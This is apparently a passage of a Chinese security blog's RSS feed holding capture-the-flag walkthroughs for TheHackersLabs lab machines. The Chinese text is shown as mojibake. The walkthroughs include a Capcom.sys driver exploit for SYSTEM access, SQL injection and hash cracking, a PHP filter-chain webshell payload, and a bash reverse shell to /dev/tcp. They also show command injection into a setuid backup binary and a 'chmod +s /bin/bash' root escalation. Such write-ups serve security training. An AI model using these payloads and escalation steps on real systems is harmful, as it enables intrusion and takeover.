å¾—åˆ°ä¸€ä¸ªå‡­æ®ï¼š`ChivasRegal:TurkisArrusPuchuchuSiu1`

å°±æ˜¯æˆ‘ä»¬ä¸Šè¾¹çœ‹åˆ°è¿œç¨‹ç®¡ç†ç»„çš„ç”¨æˆ·

```bash
âœ  PacharÃ¡n nxc winrm 192.168.69.69 -u 'Chivas Regal' -p 'TurkisArrusPuchuchuSiu1'
WINRM       192.168.69.69   5985   WIN-VRU3GG3DPLJ  [*] Windows 10 / Server 2016 Build 14393 (name:WIN-VRU3GG3DPLJ) (domain:PACHARAN.THL)
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       192.168.69.69   5985   WIN-VRU3GG3DPLJ  [+] PACHARAN.THL\Chivas Regal:TurkisArrusPuchuchuSiu1 (Pwn3d!)
```

`Chivas Regal` ç”¨æˆ·å¯ä»¥è¯»å– `user.txt`

```bash
*Evil-WinRM* PS C:\Users\Chivas Regal\Desktop> type user.txt
bb8b4xxxxxxxxxxxxxxxxxxxxxxxxxx
```

## SeLoadDriverPrivilege

`whoami` ä¿¡æ¯

![image.png](/post-images/TheHackersLabsPacharÃ¡n/image6.png)

èƒ½æ‰¾åˆ° `SeLoadDriverPrivilege` ï¼Œè¿™æ˜¯é»˜è®¤çš„è´¦æˆ·ä¸å­˜åœ¨çš„æƒé™

èƒ½æ‰¾ä¸€äº›å­˜å‚¨åº“ï¼š https://github.com/k4sth4/SeLoadDriverPrivilege

```bash
*Evil-WinRM* PS C:\temp> .\ExploitCapcom.exe LOAD C:\temp\Capcom.sys
[*] Service Name: uciifgxe
[+] Enabling SeLoadDriverPrivilege
[+] SeLoadDriverPrivilege Enabled
[+] Loading Driver: \Registry\User\S-1-5-21-3046175042-3013395696-775018414-1108\???????????????????
NTSTATUS: 00000000, WinError: 0

*Evil-WinRM* PS C:\temp> .\ExploitCapcom.exe EXPLOIT whoami
[*] Capcom.sys exploit
[*] Capcom.sys handle was obtained as 0000000000000064
[*] Shellcode was placed at 0000013180FE0008
[+] Shellcode was executed
[+] Token stealing was successful
[+] Command Executed
nt authority\system
```

æˆåŠŸæ‹¿åˆ° `system` ç”¨æˆ·æƒé™

è¿™é‡Œå¯ä»¥ä½¿ç”¨ `msf` æ¥å¼¹ï¼Œä¸å¤šèµ˜è¿°â€¦.

æœ€åè¿è¡Œæ¶æ„ `exe` å³å¯å¼¹å›æ¥

![image.png](/post-images/TheHackersLabsPacharÃ¡n/image7.png)

```bash
C:\Users\Administrador\Desktop>type root.txt
type root.txt
cfa7cb1cc20e26c0428f9222d44c76a0  -
```

## æ€»ç»“

æ‰“å°æœºé‚£é‡Œæœ‰ç‚¹æ²¡æƒ³åˆ°ï¼Œè¦çœ‹æè¿°

æœ€å SeLoadDriverPrivilege å¡äº†ä¸€ä¸‹ï¼Œ`payload`éœ€è¦æ”¹ä¸€ä¸‹]]></content:encoded>
            <category>é¶æœº</category>
            <category>TheHackersLabs</category>
            <category>Windows</category>
            <category>SeLoadDriverPrivilege</category>
            <category>Crack</category>
        </item>
        <item>
            <title><![CDATA[TheHackersLabs - Back To The Future I]]></title>
            <link>https://www.sunsetaction.top/2025/07/26/TheHackersLabsBack To The Future I</link>
            <guid isPermaLink="false">https://www.sunsetaction.top/2025/07/26/TheHackersLabsBack To The Future I</guid>
            <pubDate>Sat, 26 Jul 2025 00:00:00 GMT</pubDate>
            <description><![CDATA[Back To The Future I https://labs.thehackerslabs.com/machine/119 Recon PortScan æšä¸¾ FTP åŒ¿å HTTP æœåŠ¡ æŸ¥çœ‹æºç èƒ½æ‰¾åˆ° ç›®å½•çˆ†ç ´ about.php logs.php time machine.php ï¼ŸEI...]]></description>
            <content:encoded><![CDATA[
# Back To The Future I

> https://labs.thehackerslabs.com/machine/119
> 

![image.png](/post-images/TheHackersLabsBack%20To%20The%20Future%20I/image.png)

## Recon

### PortScan

```bash
âœ  Back_To_The_Future_I nmap -sT -min-rate 10000 -p- 192.168.56.94
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-26 14:01 CST
Nmap scan report for 192.168.56.94
Host is up (0.00056s latency).
Not shown: 65531 closed tcp ports (conn-refused)
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
3306/tcp open  mysql
MAC Address: 08:00:27:82:2C:CD (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 3.52 seconds
```

```bash
âœ  Back_To_The_Future_I nmap -sT -A -p 21,22,80,3306 192.168.56.94
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-26 14:05 CST
Nmap scan report for 192.168.56.94
Host is up (0.00051s latency).

PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u6 (protocol 2.0)
| ssh-hostkey: 
|   256 f7:c5:4a:ca:73:0e:21:ed:9f:5d:7e:35:65:f6:9f:b2 (ECDSA)
|_  256 fc:f2:e9:1a:ae:3c:da:94:f5:db:11:b2:8b:5c:7f:32 (ED25519)
80/tcp   open  http    Apache httpd 2.4.62
|_http-title: Did not follow redirect to http://hillvalley.thl/
|_http-server-header: Apache/2.4.62 (Debian)
3306/tcp open  mysql   MariaDB 10.3.23 or earlier (unauthorized)
MAC Address: 08:00:27:82:2C:CD (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 1 hop
Service Info: Host: _default_; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.51 ms 192.168.56.94

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.68 seconds
```

### æšä¸¾

`FTP` åŒ¿å

```bash
âœ  Back_To_The_Future_I ftp 192.168.56.94
Connected to 192.168.56.94.
220 (vsFTPd 3.0.3)
Name (192.168.56.94:root): anonymous
530 Permission denied.
ftp: Login failed
```

`HTTP` æœåŠ¡

![image.png](/post-images/TheHackersLabsBack%20To%20The%20Future%20I/image1.png)

æŸ¥çœ‹æºç èƒ½æ‰¾åˆ°

```bash
  <!-- Â¡El reloj de la torre no tiene nada que ver! Â¿O sÃ­? -->
  <!-- å¡”é’Ÿè·Ÿè¿™äº‹å„¿ä¸€ç‚¹å…³ç³»éƒ½æ²¡æœ‰ï¼æˆ–è€…è¯´ï¼Œæœ‰å…³ç³»ï¼Ÿ-->
```

ç›®å½•çˆ†ç ´

```bash
âœ  Back_To_The_Future_I feroxbuster --url http://hillvalley.thl/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt --filter-status 404,503,400 -x a
sp,php,txt,zip                                                                                  
                                                                                                
 ___  ___  __   __     __      __         __   ___                           
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__                                                                                                                                               
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___                                                                                                                                              
by Ben "epi" Risher ğŸ¤“                 ver: 2.11.0                                                                                                                                              
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€                                                                                                                                              
 ğŸ¯  Target Url            â”‚ http://hillvalley.thl/
 ğŸš€  Threads               â”‚ 50
 ğŸ“–  Wordlist              â”‚ /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
 ğŸ’¢  Status Code Filters   â”‚ [404, 503, 400]
 ğŸ’¥  Timeout (secs)        â”‚ 7
 ğŸ¦¡  User-Agent            â”‚ feroxbuster/2.11.0
 ğŸ’‰  Config File           â”‚ /etc/feroxbuster/ferox-config.toml
 ğŸ”  Extract Links         â”‚ true
 ğŸ’²  Extensions            â”‚ [asp, php, txt, zip]
 ğŸ  HTTP methods          â”‚ [GET]
 ğŸ”ƒ  Recursion Depth       â”‚ 4
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 ğŸ  Press [ENTER] to use the Scan Management Menuâ„¢
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
403      GET        9l       28w      279c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        9l       31w      276c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET      175l      325w     3150c http://hillvalley.thl/css/styles.css
200      GET       69l      176w     2948c http://hillvalley.thl/index.php
200      GET       69l      176w     2948c http://hillvalley.thl/
200      GET        3l       28w      240c http://hillvalley.thl/about.php
302      GET        0l        0w        0c http://hillvalley.thl/admin.php => index.php
301      GET        9l       28w      314c http://hillvalley.thl/css => http://hillvalley.thl/css/
301      GET        9l       28w      314c http://hillvalley.thl/img => http://hillvalley.thl/img/
200      GET      140l      809w    61123c http://hillvalley.thl/img/flux_capacitor.png
301      GET        9l       28w      313c http://hillvalley.thl/js => http://hillvalley.thl/js/
200      GET       23l       61w      838c http://hillvalley.thl/js/index.js
302      GET        0l        0w        0c http://hillvalley.thl/logout.php => index.php
200      GET        0l        0w        0c http://hillvalley.thl/config.php
200      GET        6l       25w      216c http://hillvalley.thl/logs.php
200      GET     9932l    58762w  4734247c http://hillvalley.thl/img/delorean.png
200      GET       28l      143w     1121c http://hillvalley.thl/time_machine.php
[####################] - 79s  1038210/1038210 0s      found:15      errors:0      
[####################] - 78s  1038145/1038145 13250/s http://hillvalley.thl/ 
[####################] - 0s   1038145/1038145 94376818/s http://hillvalley.thl/css/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 7s   1038145/1038145 146548/s http://hillvalley.thl/img/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 0s   1038145/1038145 37076607/s http://hillvalley.thl/js/ => Directory listing (add --scan-dir-listings to scan)
```

`about.php`

![image.png](/post-images/TheHackersLabsBack%20To%20The%20Future%20I/image2.png)

`logs.php`

![image.png](/post-images/TheHackersLabsBack%20To%20The%20Future%20I/image3.png)

`time_machine.php`

 ï¼ŸEI Psy Kongroo ~

![image.png](/post-images/TheHackersLabsBack%20To%20The%20Future%20I/image4.png)

æ²¡æ‰¾åˆ°ä¿¡æ¯ï¼Œå°è¯•çˆ†ç ´ç™»å½•æ¡†ï¼Œä¹Ÿæ˜¯ä¸æˆåŠŸ

![image.png](/post-images/TheHackersLabsBack%20To%20The%20Future%20I/image5.png)

æµ‹è¯•ä¸€ä¸‹ç™»å½•æ¡†

å‘ç°å­˜åœ¨ `SQL` æ³¨å…¥

![image.png](/post-images/TheHackersLabsBack%20To%20The%20Future%20I/image6.png)

## SQL æ³¨å…¥

ç›´æ¥ä¸Š `SQLmap` ï¼Œæµ‹è¯•å‡ºæ¥ å»¶æ—¶æ³¨å…¥

![image.png](/post-images/TheHackersLabsBack%20To%20The%20Future%20I/image7.png)

å°†æ•°æ®éƒ½çˆ†å‡ºæ¥

```bash
current user: 'marty@localhost'
current database: 'hillvalley'

Database: hillvalley
[1 table]
+-------+
| users |
+-------+

+----+--------------------------------------------------------------+----------+
| id | password                                                     | username |
+----+--------------------------------------------------------------+----------+
| 1  | $2y$10$.YPplAJvApyzvxjuWXdeHO1lIkolJIq9GzGERgmHqHLi.1/.zGJhy | marty    |
+----+--------------------------------------------------------------+----------+
```

å°†å¯†ç è¿›è¡Œçˆ†ç ´

```bash
âœ  Back_To_The_Future_I john --wordlist=/usr/share/wordlists/rockyou.txt hash                 
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
andromeda        (?)     
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

å¾—åˆ°ä¸€ä¸ªè´¦æˆ· `marty`:`andromeda`

## æ–‡ä»¶åŒ…å«

ç™»å½•è¿›å»åå°

![image.png](/post-images/TheHackersLabsBack%20To%20The%20Future%20I/image8.png)

å¾—åˆ°ä¸€äº›å…³äºå¯†ç ä¿¡æ¯

```bash
æˆ‘å®æ–½äº†ä¸€é¡¹åŸºæœ¬çš„å®‰å…¨æªæ–½æ¥ä¿æŠ¤å…³é”®çš„é¡¹ç›®æ–‡ä»¶ã€‚
æˆ‘ä½¿ç”¨äº†ä¸æˆ‘çš„æ—¶å…‰æœºå’Œç¬¬ä¸€æ¬¡è·³è·ƒçš„æ—¥æœŸç›¸å…³çš„å¯†ç ã€‚

é©¬è’‚æ°¸è¿œä¸ä¼šå¿˜è®°é‚£ä¸€å¤©ã€‚

â€”â€”åŒ»ç”Ÿ
```

æˆ‘ä»¬è¿˜æ³¨æ„åˆ°`URL`æ˜¯è²Œä¼¼æ˜¯åŒ…å«æ–‡ä»¶çš„ï¼Œæˆ‘ä»¬å°è¯•ä¸€ä¸‹åŒ…å«ä¸€ä¸‹åˆ«çš„æ–‡ä»¶

æˆåŠŸå°† `/etc/passwd` åŒ…å«å‡ºæ¥

![image.png](/post-images/TheHackersLabsBack%20To%20The%20Future%20I/image9.png)

å¯ä»¥ç›´æ¥å°† `user.txt` ç»™åŒ…å«å‡ºæ¥

![image.png](/post-images/TheHackersLabsBack%20To%20The%20Future%20I/image10.png)

ä½†æˆ‘ä»¬çš„ç›®çš„æ˜¯æ‹¿åˆ° `shell` 

æµ‹è¯•ä¼ªåè®®æ˜¯å¦å¯ä»¥ä½¿ç”¨

![image.png](/post-images/TheHackersLabsBack%20To%20The%20Future%20I/image11.png)

æˆ‘ä»¬å°è¯•é€šè¿‡ `php://filter/write` æ¥å†™å…¥æ–‡ä»¶ï¼Œä½†æ˜¯å¹¶æ²¡æœ‰æˆåŠŸ

```bash
php://filter/write=convert.base64-decode/resource=shell.php&data=PD9waHAgZXZhbChzeXN0ZW0oJF9QT1NUWyJ4Il0pKTtwaHBpbmZvKCk7Pz4=
```

é€šè¿‡ï¼šhttps://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/Wrappers.md

èƒ½åˆ°ä¸€ä¸ªå·¥å…· **PHP filter chain generator**ï¼šhttps://github.com/synacktiv/php_filter_chain_generator

ç”Ÿæˆ `payload`ï¼š

```bash
python3 php_filter_chain_generator.py --chain '<?php phpinfo(); ?>  '
```

![image.png](/post-images/TheHackersLabsBack%20To%20The%20Future%20I/image12.png)

ç”Ÿæˆåå¼¹ `shell` çš„ä»£ç ï¼š

```bash
	python3 php_filter_chain_generator.py --chain '<?php eval(system($_GET["x"])); ?>  '
```

æµ‹è¯•ä»£ç æ‰§è¡Œ

![image.png](/post-images/TheHackersLabsBack%20To%20The%20Future%20I/image13.png)

è¿›è¡Œåå¼¹ `shell`

```bash
/bin/bash -c 'bash -i >& /dev/tcp/192.168.56.5/1234 0>&1'
```

æ‹¿åˆ°ç«‹è¶³ç‚¹

![image.png](/post-images/TheHackersLabsBack%20To%20The%20Future%20I/image14.png)

## To Marty

æŸ¥çœ‹é…ç½®æ–‡ä»¶

```bash
www-data@hillvalley:/var/www/project/app$ cat config.php 
<?php
$host = "localhost";
$user = "marty";
$pass = "t1m3travel";
$db = "hillvalley";

$conn = mysqli_connect($host, $user, $pass, $db);
if (!$conn) {
    die("Connection failed: " . mysqli_connect_error());
}
?>
```

æ‹¿åˆ°æ•°æ®åº“è´¦å·å¯†ç ï¼Œå› ä¸ºç”¨æˆ·åæ˜¯ `marty` ï¼Œæˆ‘ä»¬é¡ºä¾¿ç¢°æ’ä¸€ä¸‹å¯†ç 

```bash
www-data@hillvalley:/var/www/project/app$ su marty
Password: 
marty@hillvalley:/var/www/project/app$ 
```

æˆåŠŸåˆ‡æ¢åˆ°ç”¨æˆ·`Marty`

æˆ‘ä»¬å†™å…¥ `SSH` å…¬é’¥ï¼Œä½¿ç”¨å…¬é’¥è¿›è¡Œç™»å½•

## To docbrown

å®¶ç›®å½•ä¸‹çš„éšè—æ–‡ä»¶

```bash
marty@hillvalley:~$ cat .flux_notes 
Tiempos inestables... aÃºn necesito arreglar el runner para la prÃ³xima prueba.
```

> æ—¶é—´ä¸ç¨³å®š...ä»ç„¶éœ€è¦ä¿®å¤è¿è¡Œå™¨ä»¥è¿›è¡Œä¸‹ä¸€æ¬¡æµ‹è¯•ã€‚
> 

èƒ½ç›´æ¥çœ‹`docbrown`çš„å®¶ç›®å½•

```bash
marty@hillvalley:/home/docbrown$ ls -al
total 88
drwxr-xr-x 15 docbrown docbrown 4096 Jul 15 10:45 .
drwxr-xr-x  4 root     root     4096 Jul 12 15:49 ..
lrwxrwxrwx  1 root     root        9 Jul 13 16:50 .bash_history -> /dev/null
-rw-r--r--  1 docbrown docbrown  220 Jul 11 22:04 .bash_logout
-rw-r--r--  1 docbrown docbrown 3662 Jul 12 20:23 .bashrc
drwx------ 10 docbrown docbrown 4096 Jul 11 22:27 .cache
drwx------  9 docbrown docbrown 4096 Jul 12 20:41 .config
-rw-r--r--  1 docbrown docbrown 5290 Jul 11 22:04 .face
lrwxrwxrwx  1 docbrown docbrown    5 Jul 11 22:04 .face.icon -> .face
-rw-r--r--  1 docbrown docbrown  110 Jul 13 14:10 .flux_hint
drwx------  4 docbrown docbrown 4096 Jul 11 22:08 .local
drwx------  4 docbrown docbrown 4096 Jul 11 22:27 .mozilla
-rw-r--r--  1 docbrown docbrown  807 Jul 11 22:04 .profile
-rw-------  1 docbrown docbrown  817 Jul 13 12:52 .viminfo
drwxr-xr-x  2 docbrown docbrown 4096 Jul 11 22:08 Desktop
drwxr-xr-x  2 docbrown docbrown 4096 Jul 11 22:08 Documents
drwxr-xr-x  2 docbrown docbrown 4096 Jul 11 22:08 Downloads
drwxr-xr-x  2 docbrown docbrown 4096 Jul 11 22:08 Music
drwxr-xr-x  2 docbrown docbrown 4096 Jul 11 22:08 Pictures
drwxr-xr-x  2 docbrown docbrown 4096 Jul 11 22:08 Public
drwxr-xr-x  2 docbrown docbrown 4096 Jul 11 22:08 Templates
drwxr-xr-x  2 docbrown docbrown 4096 Jul 11 22:08 Videos
drwxrwxrwx  2 docbrown docbrown 4096 Jul 12 20:49 docs
```

`.flux_hint`

```bash
marty@hillvalley:/home/docbrown$ cat .flux_hint 
He estado trabajando en una nueva forma de sincronizar los scripts del sistema. Cada minuto... como un reloj.
```

> æˆ‘ä¸€ç›´åœ¨ç ”ç©¶ä¸€ç§åŒæ­¥ç³»ç»Ÿè„šæœ¬çš„æ–°æ–¹æ³•ã€‚åˆ†åˆ†ç§’ç§’â€¦â€¦ç²¾å‡†æ— è¯¯ã€‚
> 

æåˆ°äº†åŒæ­¥ç³»ç»Ÿè„šæœ¬ï¼Œæˆ‘ä»¬ä¸Š`pspy`çœ‹çœ‹

![image.png](/post-images/TheHackersLabsBack%20To%20The%20Future%20I/image15.png)

æ³¨æ„åˆ° **`/usr/local/bin/flux_admin.sh`**

ä½†æ˜¯æ ¹ç›®å½•ä¸­ä¹Ÿæ˜¯æ²¡æœ‰

```bash
marty@hillvalley:/usr/local/bin$ ls -al
total 40
drwxr-xr-x  2 root root  4096 Jul 14 21:53 .
drwxr-xr-x 10 root root  4096 Jul 11 21:56 ..
-rwxr-xr-x  1 root root 16200 Jul 12 20:49 backup_runner
-rwx------  1 root root 16296 Jul 14 20:44 time_daemon
```

ä¸Š `linpeas.sh` çœ‹çœ‹

å¯ä»¥æ³¨æ„åˆ°å¦‚ä¸‹ä¿¡æ¯

```bash
Files with capabilities (limited to 50): 
/usr/local/bin/backup_runner cap_setuid=ep 
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap_net_bind_service,cap_net_admin=ep
/usr/bin/ping cap_net_raw=ep 
```

å½“ç¨‹åº `backup_runner` è¿è¡Œæ—¶ä¸€äº›æ‹¥æœ‰ `setuid` æƒé™ï¼Œå¯ä»¥ä»¥å…¶ä»–ç”¨æˆ·æƒé™è¿è¡Œ

æˆ‘ä»¬å°†å…¶æ‹‰å‡ºå»åˆ†æä¸€ä¸‹

```bash
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char s[264]; // [rsp+10h] [rbp-110h] BYREF
  const char *v5; // [rsp+118h] [rbp-8h]

  if ( argc != 2 )
    usage(argc, argv, envp);
  v5 = argv[1];
  snprintf(s, 0x100uLL, "tar czf /tmp/%s-backup.tar.gz /home/docbrown/docs", v5);
  setuid(0x3E8u);
  system(s);
  return 0;
}
```

å…¶ä¸­çš„ `setuid(0x3E8u);` ä¹Ÿå°±æ˜¯ `1000` ï¼Œè€Œ `1000` åˆšå¥½æ˜¯ `docbrown`

å¹¶ä¸”æ‰§è¡Œçš„å‘½ä»¤æ˜¯ `tar czf /tmp/%s-backup.tar.gz /home/docbrown/docs`

è¯¥ç¨‹åºå­˜åœ¨å‘½ä»¤æ³¨å…¥ï¼Œå› ä¸º `v5` å¹¶æ²¡æœ‰è¢«å¤„ç†ï¼Œè€Œæ˜¯ç›´æ¥è¢«è°ƒç”¨

```bash
"; id ;"
```

```bash
marty@hillvalley:/home/docbrown$ /usr/local/bin/backup_runner "; id ;"
tar: Cowardly refusing to create an empty archive
Try 'tar --help' or 'tar --usage' for more information.
uid=1000(docbrown) gid=1001(marty) groups=1001(marty)
sh: 1: -backup.tar.gz: not found
```

è·å¾— `docbrown` çš„ `shell`

```bash
marty@hillvalley:/home/docbrown$ /usr/local/bin/backup_runner "; /bin/bash -p ;"
tar: Cowardly refusing to create an empty archive
Try 'tar --help' or 'tar --usage' for more information.
docbrown@hillvalley:/home/docbrown$ 
```

## To Root

æŸ¥çœ‹ `sudo` æƒé™

```bash
docbrown@hillvalley:/home/docbrown$ sudo -l
Matching Defaults entries for docbrown on hillvaley:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User docbrown may run the following commands on hillvaley:
    (root) NOPASSWD: /usr/local/bin/time_daemon
```

æˆ‘ä»¬å°è¯•è¿è¡Œä¸€ä¸‹

```bash
[FLUX] No existe el archivo /tmp/sync: No such file or directory
```

```bash
docbrown@hillvalley:/tmp$ vim sync
docbrown@hillvalley:/tmp$ sudo time_daemon
[88MPH] SincronizaciÃ³n completada. Listo para viajar.
```

![image.png](/post-images/TheHackersLabsBack%20To%20The%20Future%20I/image16.png)

è²Œä¼¼æ˜¯åˆ›å»ºå®šæ—¶ä»»åŠ¡

æˆ‘ä»¬å°†ææƒè¯­å¥å†™å…¥ `/tmp/sync` å¹¶è¿è¡Œ `time_deamon`

```bash
docbrown@hillvalley:/tmp$ echo "chmod +s /bin/bash" > /tmp/sync

docbrown@hillvalley:/usr/local/bin$ sudo /usr/local/bin/time_daemon
[88MPH] SincronizaciÃ³n completada. Listo para viajar.
```

ç­‰åœ¨ `pspy` æ˜¾ç¤ºè¿è¡Œè®¡åˆ’ä»»åŠ¡ï¼Œå†æŸ¥çœ‹

```bash
docbrown@hillvalley:/usr/local/bin$ ls -al /bin/bash
-rwsr-sr-x 1 root root 1265648 Apr 18 19:47 /bin/bash
```

æœ€åè¯»å– `root.txt`

```bash
bash-5.2# cat notes.txt 
Â¡Felicidades, viajero del tiempo!

Lograste lo imposible: viajaste al pasado, burlaste sistemas protegidos, superaste obstÃ¡culos temporales y... 
Â¡volviste al futuro con todos los flags en el DeLorean!

Doc estarÃ­a orgulloso, y Martyâ€¦ bueno, seguro todavÃ­a estÃ¡ en problemas con Biff. 
Pero vosâ€¦ vos demostraste que no hay sistema que se te resista ni timeline que no puedas manipular.

    â€œEl futuro no estÃ¡ escrito, todavÃ­a. El tuyo serÃ¡ exactamente como lo hagas.â€
    â€” Doc Emmett Brown

Gracias por jugar este CTF inspirado en una de las mejores trilogÃ­as de todos los tiempos. 

Si disfrutaste el viaje, no olvides compartir tus hallazgos con otros hackers del tiempo y prepararte para los prÃ³ximos desafÃ­os que se vienen en la saga.

bash-5.2# cat root.txt 
FLAGxxxxxxxxxxxxxxxxxxxxxx
```

## æ€»ç»“

éš¾åº¦è¿˜å¥½ï¼Œå°±æ˜¯æœ‰äº›åœ°æ–¹ä¼šå¡ä½]]></content:encoded>
            <category>é¶æœº</category>
            <category>TheHackersLabs</category>
            <category>Linux</category>
            <category>SQLInjection</category>
            <category>FileInclude</category>
            <category>CommandInjection</category>
        </item>
        <item>
            <title><![CDATA[TheHackersLabs - NodeCeption]]></title>
            <link>https://www.sunsetaction.top/2025/07/25/TheHackersLabsNodeCeption</link>
            <guid isPermaLink="false">https://www.sunsetaction.top/2025/07/25/TheHackersLabsNodeCeption</guid>
            <pubDate>Fri, 25 Jul 2025 00:00:00 GMT</pubDate>
            <description><![CDATA[NodeCeption https://labs.thehackerslabs.com/machine/118 Recon PortScan æšä¸¾æµ‹è¯• 8765 Apacheé»˜è®¤é¡µé¢ 5678 n8n n8n å¯ä»¥åå¼¹ shellï¼Œä½†æ˜¯è¦è¿›å…¥åå°ï¼Œå¹¶ä¸”éœ€è¦é‚®ç®±å’Œå¯†ç  å¯†ç çˆ†ç ´ æˆ‘ä¹ˆå¯»æ‰¾ä¸€ä¸‹å“ªé‡Œèƒ½æ‰¾åˆ°...]]></description>
            <content:encoded><![CDATA[
# NodeCeption

> https://labs.thehackerslabs.com/machine/118
> 

![image.png](/post-images/TheHackersLabsNodeCeption/image.png)

## Recon

### PortScan

```bash
âœ  NodeCeption nmap -sn 192.168.56.0/24
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-25 20:09 CST
Nmap scan report for 192.168.56.1
Host is up (0.00034s latency).
MAC Address: 0A:00:27:00:00:09 (Unknown)
Nmap scan report for 192.168.56.2
Host is up (0.00028s latency).
MAC Address: 08:00:27:BE:8A:D9 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.88
Host is up (0.00058s latency).
MAC Address: 08:00:27:B3:A3:BC (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.5
Host is up.
Nmap done: 256 IP addresses (4 hosts up) scanned in 2.09 seconds
```

```bash
âœ  NodeCeption nmap -sT -min-rate 10000 -p- 192.168.56.88
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-25 20:11 CST
Nmap scan report for 192.168.56.88
Host is up (0.00070s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
5678/tcp open  rrac
8765/tcp open  ultraseek-http
MAC Address: 08:00:27:B3:A3:BC (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 3.73 seconds
```

```bash
âœ  NodeCeption nmap -sT -A -p 22,5678,8765 192.168.56.88
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-25 20:12 CST
Nmap scan report for 192.168.56.88
Host is up (0.00053s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 67:df:2b:e6:48:16:ec:91:b1:a6:67:25:37:05:fc:0f (ECDSA)
|_  256 dc:ab:74:b7:be:b5:49:6a:c8:7b:db:6b:7c:91:73:69 (ED25519)
5678/tcp open  rrac?
| fingerprint-strings:
|   GetRequest:
|     HTTP/1.1 200 OK
|     Accept-Ranges: bytes
|     Cache-Control: public, max-age=86400
|     Last-Modified: Fri, 25 Jul 2025 12:09:30 GMT
|     ETag: W/"7b7-198417d0a9c"
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 1975
|     Vary: Accept-Encoding
|     Date: Fri, 25 Jul 2025 12:12:38 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <script type="module" crossorigin src="/assets/polyfills-B8p9DdqU.js"></script>
...
8765/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port5678-TCP:V=7.95%I=7%D=7/25%Time=688374B9%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,8DC,"HTTP/1\.1\x20200\x20OK\r\nAccept-Ranges:\x20bytes\r\nCach
SF:e-Control:\x20public,\x20max-age=86400\r\nLast-Modified:\x20Fri,\x2025\
SF:x20Jul\x202025\x2012:09:30\x20GMT\r\nETag:\x20W/\"7b7-198417d0a9c\"\r\n
SF:Content-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x201975
